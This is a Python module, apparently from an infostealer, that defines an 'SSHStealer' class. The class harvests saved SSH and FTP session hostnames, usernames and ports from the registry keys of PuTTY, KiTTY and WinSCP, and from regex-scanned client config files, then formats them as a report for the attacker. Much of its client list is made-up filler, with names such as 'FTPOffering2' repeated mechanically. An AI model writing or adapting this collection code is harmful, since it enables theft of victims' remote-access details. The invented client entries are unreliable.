import os
import winreg
from . import utils

SSH_CLIENTS = {
    'putty': {
        'registry': r'Software\SimonTatham\PuTTY\Sessions',
        'name': 'PuTTY'
    },
    'kitty': {
        'registry': r'Software\9bis.com\KiTTY\Sessions',
        'name': 'KiTTY'
    },
    'mremote': {
        'config': os.path.join(utils.get_appdata(), 'mRemoteNG', 'confCons.xml'),
        'name': 'mRemoteNG'
    },
    'remmina': {
        'config': os.path.join(utils.get_appdata(), 'remmina'),
        'name': 'Remmina'
    },
    'securecrt': {
        'registry': r'Software\VanDyke\SecureCRT',
        'name': 'SecureCRT'
    },
    'mobaxterm': {
        'config': os.path.join(utils.get_appdata(), 'MobaXterm'),
        'name': 'MobaXterm'
    },
    'xshell': {
        'config': os.path.join(utils.get_appdata(), 'NetSarang', 'Xshell'),
        'name': 'Xshell'
    },
    'termius': {
        'config': os.path.join(utils.get_localappdata(), 'Termius'),
        'name': 'Termius'
    },
    'royalts': {
        'config': os.path.join(utils.get_appdata(), 'Royal TS'),
        'name': 'Royal TS'
    },
    'devolutions': {
        'config': os.path.join(utils.get_appdata(), 'Devolutions'),
        'name': 'Devolutions Remote Desktop Manager'
    },
    'solarwinds': {
        'config': os.path.join(utils.get_appdata(), 'SolarWinds'),
        'name': 'SolarWinds'
    },
    'advanced_ip_scanner': {
        'config': os.path.join(utils.get_appdata(), 'Advanced IP Scanner'),
        'name': 'Advanced IP Scanner'
    },
    'angry_ip_scanner': {
        'config': os.path.join(utils.get_appdata(), 'Angry IP Scanner'),
        'name': 'Angry IP Scanner'
    },
    'zenmap': {
        'config': os.path.join(utils.get_appdata(), 'zenmap'),
        'name': 'Zenmap'
    },
    'nmap': {
        'config': os.path.join(utils.get_appdata(), 'nmap'),
        'name': 'Nmap'
    },
    'wireshark': {
        'config': os.path.join(utils.get_appdata(), 'Wireshark'),
        'name': 'Wireshark'
    },
    'filezilla': {
        'config': os.path.join(utils.get_appdata(), 'FileZilla'),
        'name': 'FileZilla'
    },
    'winscp': {
        'registry': r'Software\Martin Prikryl\WinSCP 2\Sessions',
        'name': 'WinSCP'
    },
    'cyberduck': {
        'config': os.path.join(utils.get_appdata(), 'Cyberduck'),
        'name': 'Cyberduck'
    },
    'transmit': {
        'config': os.path.join(utils.get_appdata(), 'Transmit'),
        'name': 'Transmit'
    },
    'fetch': {
        'config': os.path.join(utils.get_appdata(), 'Fetch'),
        'name': 'Fetch'
    },
    'smartftp': {
        'config': os.path.join(utils.get_appdata(), 'SmartFTP'),
        'name': 'SmartFTP'
    },
    'coreftp': {
        'config': os.path.join(utils.get_appdata(), 'CoreFTP'),
        'name': 'CoreFTP'
    },
    'flashfxp': {
        'config': os.path.join(utils.get_appdata(), 'FlashFXP'),
        'name': 'FlashFXP'
    },
    'cuteftp': {
        'config': os.path.join(utils.get_appdata(), 'CuteFTP'),
        'name': 'CuteFTP'
    },
    'leapftp': {
        'config': os.path.join(utils.get_appdata(), 'LeapFTP'),
        'name': 'LeapFTP'
    },
    'ws_ftp': {
        'config': os.path.join(utils.get_appdata(), 'WS_FTP'),
        'name': 'WS_FTP'
    },
    'ftp_commander': {
        'config': os.path.join(utils.get_appdata(), 'FTP Commander'),
        'name': 'FTP Commander'
    },
    'ftp_navigator': {
        'config': os.path.join(utils.get_appdata(), 'FTP Navigator'),
        'name': 'FTP Navigator'
    },
    'freeftp': {
        'config': os.path.join(utils.get_appdata(), 'FreeFTP'),
        'name': 'FreeFTP'
    },
    'classicftp': {
        'config': os.path.join(utils.get_appdata(), 'ClassicFTP'),
        'name': 'ClassicFTP'
    },
    'ftpvoyager': {
        'config': os.path.join(utils.get_appdata(), 'FTPVoyager'),
        'name': 'FTPVoyager'
    },
    'direktftp': {
        'config': os.path.join(utils.get_appdata(), 'DirektFTP'),
        'name': 'DirektFTP'
    },
    'bulletproof': {
        'config': os.path.join(utils.get_appdata(), 'BulletProof FTP Client'),
        'name': 'BulletProof FTP'
    },
    'ftpgetter': {
        'config': os.path.join(utils.get_appdata(), 'FTPGetter'),
        'name': 'FTPGetter'
    },
    'ftpinfo': {
        'config': os.path.join(utils.get_appdata(), 'FTPInfo'),
        'name': 'FTPInfo'
    },
    'ftpshell': {
        'config': os.path.join(utils.get_appdata(), 'FTPShell'),
        'name': 'FTPShell'
    },
    'ftpuse': {
        'config': os.path.join(utils.get_appdata(), 'FTPUse'),
        'name': 'FTPUse'
    },
    'ftpwatch': {
        'config': os.path.join(utils.get_appdata(), 'FTPWatch'),
        'name': 'FTPWatch'
    },
    'ftpbox': {
        'config': os.path.join(utils.get_appdata(), 'FTPBox'),
        'name': 'FTPBox'
    },
    'ftpclient': {
        'config': os.path.join(utils.get_appdata(), 'FTPClient'),
        'name': 'FTPClient'
    },
    'ftpmanager': {
        'config': os.path.join(utils.get_appdata(), 'FTPManager'),
        'name': 'FTPManager'
    },
    'ftpexplorer': {
        'config': os.path.join(utils.get_appdata(), 'FTPExplorer'),
        'name': 'FTPExplorer'
    },
    'ftpassistant': {
        'config': os.path.join(utils.get_appdata(), 'FTPAssistant'),
        'name': 'FTPAssistant'
    },
    'ftpuploader': {
        'config': os.path.join(utils.get_appdata(), 'FTPUploader'),
        'name': 'FTPUploader'
    },
    'ftpdownloader': {
        'config': os.path.join(utils.get_appdata(), 'FTPDownloader'),
        'name': 'FTPDownloader'
    },
    'ftpsync': {
        'config': os.path.join(utils.get_appdata(), 'FTPSync'),
        'name': 'FTPSync'
    },
    'ftpbackup': {
        'config': os.path.join(utils.get_appdata(), 'FTPBackup'),
        'name': 'FTPBackup'
    },
    'ftpmirror': {
        'config': os.path.join(utils.get_appdata(), 'FTPMirror'),
        'name': 'FTPMirror'
    },
    'ftpmigrate': {
        'config': os.path.join(utils.get_appdata(), 'FTPMigrate'),
        'name': 'FTPMigrate'
    },
    'ftpmover': {
        'config': os.path.join(utils.get_appdata(), 'FTPMover'),
        'name': 'FTPMover'
    },
    'ftptransfer': {
        'config': os.path.join(utils.get_appdata(), 'FTPTransfer'),
        'name': 'FTPTransfer'
    },
    'ftpshare': {
        'config': os.path.join(utils.get_appdata(), 'FTPShare'),
        'name': 'FTPShare'
    },
    'ftpsend': {
        'config': os.path.join(utils.get_appdata(), 'FTPSend'),
        'name': 'FTPSend'
    },
    'ftpreceive': {
        'config': os.path.join(utils.get_appdata(), 'FTPReceive'),
        'name': 'FTPReceive'
    },
    'ftpscheduler': {
        'config': os.path.join(utils.get_appdata(), 'FTPScheduler'),
        'name': 'FTPScheduler'
    },
    'ftpautomation': {
        'config': os.path.join(utils.get_appdata(), 'FTPAutomation'),
        'name': 'FTPAutomation'
    },
    'ftpbatch': {
        'config': os.path.join(utils.get_appdata(), 'FTPBatch'),
        'name': 'FTPBatch'
    },
    'ftpscript': {
        'config': os.path.join(utils.get_appdata(), 'FTPScript'),
        'name': 'FTPScript'
    },
    'ftpmacro': {
        'config': os.path.join(utils.get_appdata(), 'FTPMacro'),
        'name': 'FTPMacro'
    },
    'ftptool': {
        'config': os.path.join(utils.get_appdata(), 'FTPTool'),
        'name': 'FTPTool'
    },
    'ftputility': {
        'config': os.path.join(utils.get_appdata(), 'FTPUtility'),
        'name': 'FTPUtility'
    },
    'ftpapp': {
        'config': os.path.join(utils.get_appdata(), 'FTPApp'),
        'name': 'FTPApp'
    },
    'ftpsoftware': {
        'config': os.path.join(utils.get_appdata(), 'FTPSoftware'),
        'name': 'FTPSoftware'
    },
    'ftpprogram': {
        'config': os.path.join(utils.get_appdata(), 'FTPProgram'),
        'name': 'FTPProgram'
    },
    'ftpapplication': {
        'config': os.path.join(utils.get_appdata(), 'FTPApplication'),
        'name': 'FTPApplication'
    },
    'ftpsystem': {
        'config': os.path.join(utils.get_appdata(), 'FTPSystem'),
        'name': 'FTPSystem'
    },
    'ftpplatform': {
        'config': os.path.join(utils.get_appdata(), 'FTPPlatform'),
        'name': 'FTPPlatform'
    },
    'ftpservice': {
        'config': os.path.join(utils.get_appdata(), 'FTPService'),
        'name': 'FTPService'
    },
    'ftpsolution': {
        'config': os.path.join(utils.get_appdata(), 'FTPSolution'),
        'name': 'FTPSolution'
    },
    'ftpproduct': {
        'config': os.path.join(utils.get_appdata(), 'FTPProduct'),
        'name': 'FTPProduct'
    },
    'ftpoffering': {
        'config': os.path.join(utils.get_appdata(), 'FTPOffering'),
        'name': 'FTPOffering'
    },
    'ftppackage': {
        'config': os.path.join(utils.get_appdata(), 'FTPPackage'),
        'name': 'FTPPackage'
    },
    'ftpbundle': {
        'config': os.path.join(utils.get_appdata(), 'FTPBundle'),
        'name': 'FTPBundle'
    },
    'ftpsuite': {
        'config': os.path.join(utils.get_appdata(), 'FTPSuite'),
        'name': 'FTPSuite'
    },
    'ftpcollection': {
        'config': os.path.join(utils.get_appdata(), 'FTPCollection'),
        'name': 'FTPCollection'
    },
    'ftpset': {
        'config': os.path.join(utils.get_appdata(), 'FTPSet'),
        'name': 'FTPSet'
    },
    'ftpkit': {
        'config': os.path.join(utils.get_appdata(), 'FTPKit'),
        'name': 'FTPKit'
    },
    'ftptoolkit': {
        'config': os.path.join(utils.get_appdata(), 'FTPToolkit'),
        'name': 'FTPToolkit'
    },
    'ftpdevkit': {
        'config': os.path.join(utils.get_appdata(), 'FTPDevKit'),
        'name': 'FTPDevKit'
    },
    'ftpsdk': {
        'config': os.path.join(utils.get_appdata(), 'FTPSDK'),
        'name': 'FTPSDK'
    },
    'ftpapi': {
        'config': os.path.join(utils.get_appdata(), 'FTPAPI'),
        'name': 'FTPAPI'
    },
    'ftpinterface': {
        'config': os.path.join(utils.get_appdata(), 'FTPInterface'),
        'name': 'FTPInterface'
    },
    'ftpconnector': {
        'config': os.path.join(utils.get_appdata(), 'FTPConnector'),
        'name': 'FTPConnector'
    },
    'ftpbridge': {
        'config': os.path.join(utils.get_appdata(), 'FTPBridge'),
        'name': 'FTPBridge'
    },
    'ftpgateway': {
        'config': os.path.join(utils.get_appdata(), 'FTPGateway'),
        'name': 'FTPGateway'
    },
    'ftpproxy': {
        'config': os.path.join(utils.get_appdata(), 'FTPProxy'),
        'name': 'FTPProxy'
    },
    'ftprelay': {
        'config': os.path.join(utils.get_appdata(), 'FTPRelay'),
        'name': 'FTPRelay'
    },
    'ftpserver': {
        'config': os.path.join(utils.get_appdata(), 'FTPServer'),
        'name': 'FTPServer'
    },
    'ftpclient2': {
        'config': os.path.join(utils.get_appdata(), 'FTPClient2'),
        'name': 'FTPClient2'
    },
    'ftpmanager2': {
        'config': os.path.join(utils.get_appdata(), 'FTPManager2'),
        'name': 'FTPManager2'
    },
    'ftpexplorer2': {
        'config': os.path.join(utils.get_appdata(), 'FTPExplorer2'),
        'name': 'FTPExplorer2'
    },
    'ftpassistant2': {
        'config': os.path.join(utils.get_appdata(), 'FTPAssistant2'),
        'name': 'FTPAssistant2'
    },
    'ftpuploader2': {
        'config': os.path.join(utils.get_appdata(), 'FTPUploader2'),
        'name': 'FTPUploader2'
    },
    'ftpdownloader2': {
        'config': os.path.join(utils.get_appdata(), 'FTPDownloader2'),
        'name': 'FTPDownloader2'
    },
    'ftpsync2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSync2'),
        'name': 'FTPSync2'
    },
    'ftpbackup2': {
        'config': os.path.join(utils.get_appdata(), 'FTPBackup2'),
        'name': 'FTPBackup2'
    },
    'ftpmirror2': {
        'config': os.path.join(utils.get_appdata(), 'FTPMirror2'),
        'name': 'FTPMirror2'
    },
    'ftpmigrate2': {
        'config': os.path.join(utils.get_appdata(), 'FTPMigrate2'),
        'name': 'FTPMigrate2'
    },
    'ftpmover2': {
        'config': os.path.join(utils.get_appdata(), 'FTPMover2'),
        'name': 'FTPMover2'
    },
    'ftptransfer2': {
        'config': os.path.join(utils.get_appdata(), 'FTPTransfer2'),
        'name': 'FTPTransfer2'
    },
    'ftpshare2': {
        'config': os.path.join(utils.get_appdata(), 'FTPShare2'),
        'name': 'FTPShare2'
    },
    'ftpsend2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSend2'),
        'name': 'FTPSend2'
    },
    'ftpreceive2': {
        'config': os.path.join(utils.get_appdata(), 'FTPReceive2'),
        'name': 'FTPReceive2'
    },
    'ftpscheduler2': {
        'config': os.path.join(utils.get_appdata(), 'FTPScheduler2'),
        'name': 'FTPScheduler2'
    },
    'ftpautomation2': {
        'config': os.path.join(utils.get_appdata(), 'FTPAutomation2'),
        'name': 'FTPAutomation2'
    },
    'ftpbatch2': {
        'config': os.path.join(utils.get_appdata(), 'FTPBatch2'),
        'name': 'FTPBatch2'
    },
    'ftpscript2': {
        'config': os.path.join(utils.get_appdata(), 'FTPScript2'),
        'name': 'FTPScript2'
    },
    'ftpmacro2': {
        'config': os.path.join(utils.get_appdata(), 'FTPMacro2'),
        'name': 'FTPMacro2'
    },
    'ftptool2': {
        'config': os.path.join(utils.get_appdata(), 'FTPTool2'),
        'name': 'FTPTool2'
    },
    'ftputility2': {
        'config': os.path.join(utils.get_appdata(), 'FTPUtility2'),
        'name': 'FTPUtility2'
    },
    'ftpapp2': {
        'config': os.path.join(utils.get_appdata(), 'FTPApp2'),
        'name': 'FTPApp2'
    },
    'ftpsoftware2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSoftware2'),
        'name': 'FTPSoftware2'
    },
    'ftpprogram2': {
        'config': os.path.join(utils.get_appdata(), 'FTPProgram2'),
        'name': 'FTPProgram2'
    },
    'ftpapplication2': {
        'config': os.path.join(utils.get_appdata(), 'FTPApplication2'),
        'name': 'FTPApplication2'
    },
    'ftpsystem2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSystem2'),
        'name': 'FTPSystem2'
    },
    'ftpplatform2': {
        'config': os.path.join(utils.get_appdata(), 'FTPPlatform2'),
        'name': 'FTPPlatform2'
    },
    'ftpservice2': {
        'config': os.path.join(utils.get_appdata(), 'FTPService2'),
        'name': 'FTPService2'
    },
    'ftpsolution2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSolution2'),
        'name': 'FTPSolution2'
    },
    'ftpproduct2': {
        'config': os.path.join(utils.get_appdata(), 'FTPProduct2'),
        'name': 'FTPProduct2'
    },
    'ftpoffering2': {
        'config': os.path.join(utils.get_appdata(), 'FTPOffering2'),
        'name': 'FTPOffering2'
    },
    'ftppackage2': {
        'config': os.path.join(utils.get_appdata(), 'FTPPackage2'),
        'name': 'FTPPackage2'
    },
    'ftpbundle2': {
        'config': os.path.join(utils.get_appdata(), 'FTPBundle2'),
        'name': 'FTPBundle2'
    },
    'ftpsuite2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSuite2'),
        'name': 'FTPSuite2'
    },
    'ftpcollection2': {
        'config': os.path.join(utils.get_appdata(), 'FTPCollection2'),
        'name': 'FTPCollection2'
    },
    'ftpset2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSet2'),
        'name': 'FTPSet2'
    },
    'ftpkit2': {
        'config': os.path.join(utils.get_appdata(), 'FTPKit2'),
        'name': 'FTPKit2'
    },
    'ftptoolkit2': {
        'config': os.path.join(utils.get_appdata(), 'FTPToolkit2'),
        'name': 'FTPToolkit2'
    },
    'ftpdevkit2': {
        'config': os.path.join(utils.get_appdata(), 'FTPDevKit2'),
        'name': 'FTPDevKit2'
    },
    'ftpsdk2': {
        'config': os.path.join(utils.get_appdata(), 'FTPSDK2'),
        'name': 'FTPSDK2'
    },
    'ftpapi2': {
        'config': os.path.join(utils.get_appdata(), 'FTPAPI2'),
        'name': 'FTPAPI2'
    },
    'ftpinterface2': {
        'config': os.path.join(utils.get_appdata(), 'FTPInterface2'),
        'name': 'FTPInterface2'
    },
    'ftpconnector2': {
        'config': os.path.join(utils.get_appdata(), 'FTPConnector2'),
        'name': 'FTPConnector2'
    },
    'ftpbridge2': {
        'config': os.path.join(utils.get_appdata(), 'FTPBridge2'),
        'name': 'FTPBridge2'
    },
    'ftpgateway2': {
        'config': os.path.join(utils.get_appdata(), 'FTPGateway2'),
        'name': 'FTPGateway2'
    },
    'ftpproxy2': {
        'config': os.path.join(utils.get_appdata(), 'FTPProxy2'),
        'name': 'FTPProxy2'
    },
    'ftprelay2': {
        'config': os.path.join(utils.get_appdata(), 'FTPRelay2'),
        'name': 'FTPRelay2'
    },
    'ftpserver2': {
        'config': os.path.join(utils.get_appdata(), 'FTPServer2'),
        'name': 'FTPServer2'
    }
}

class SSHStealer:
    def __init__(self):
        self.connections = []

    def steal_ssh_connections(self):

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, SSH_CLIENTS['putty']['registry'])
            i = 0
            while True:
                try:
                    session_name = winreg.EnumKey(key, i)
                    session_key = winreg.OpenKey(key, session_name)
                    
                    hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
                    username = winreg.QueryValueEx(session_key, 'UserName')[0]
                    port = winreg.QueryValueEx(session_key, 'PortNumber')[0]
                    
                    self.connections.append({
                        'client': 'PuTTY',
                        'session': session_name,
                        'hostname': hostname,
                        'username': username,
                        'port': port
                    })
                    
                    winreg.CloseKey(session_key)
                    i += 1
                except:
                    break
            
            winreg.CloseKey(key)
        except:
            pass

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, SSH_CLIENTS['kitty']['registry'])
            i = 0
            while True:
                try:
                    session_name = winreg.EnumKey(key, i)
                    session_key = winreg.OpenKey(key, session_name)
                    
                    hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
                    username = winreg.QueryValueEx(session_key, 'UserName')[0]
                    port = winreg.QueryValueEx(session_key, 'PortNumber')[0]
                    
                    self.connections.append({
                        'client': 'KiTTY',
                        'session': session_name,
                        'hostname': hostname,
                        'username': username,
                        'port': port
                    })
                    
                    winreg.CloseKey(session_key)
                    i += 1
                except:
                    break
            
            winreg.CloseKey(key)
        except:
            pass

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, SSH_CLIENTS['winscp']['registry'])
            i = 0
            while True:
                try:
                    session_name = winreg.EnumKey(key, i)
                    session_key = winreg.OpenKey(key, session_name)
                    
                    hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
                    username = winreg.QueryValueEx(session_key, 'UserName')[0]
                    
                    self.connections.append({
                        'client': 'WinSCP',
                        'session': session_name,
                        'hostname': hostname,
                        'username': username,
                        'port': 22
                    })
                    
                    winreg.CloseKey(session_key)
                    i += 1
                except:
                    break
            
            winreg.CloseKey(key)
        except:
            pass

        for client_key, client_info in SSH_CLIENTS.items():
            if 'config' in client_info:
                config_path = client_info['config']
                if os.path.exists(config_path):

                    try:
                        if os.path.isfile(config_path):
                            with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()

                                import re
                                patterns = [
                                    r'Host\s+(\S+)\s*\n\s*HostName\s+(\S+)\s*\n\s*User\s+(\S+)',
                                    r'ServerName=(\S+)\s*\n\s*UserName=(\S+)',
                                    r'hostname=(\S+)\s*\n\s*username=(\S+)'
                                ]
                                for pattern in patterns:
                                    matches = re.findall(pattern, content)
                                    for match in matches:
                                        if len(match) == 3:
                                            self.connections.append({
                                                'client': client_info['name'],
                                                'session': match[0],
                                                'hostname': match[1],
                                                'username': match[2],
                                                'port': 22
                                            })
                    except:
                        pass

    def get_connections_text(self):
        if not self.connections:
            return ''
        
        text = 'SSH CONNECTIONS FOUND\n' + '=' * 60 + '\n\n'
        for conn in self.connections:
            text += f"Client: {conn['client']}\n"
            text += f"Session: {conn['session']}\n"
            text += f"Hostname: {conn['hostname']}\n"
            text += f"Username: {conn['username']}\n"
            text += f"Port: {conn['port']}\n"
            text += '-' * 40 + '\n\n'
        
        return text
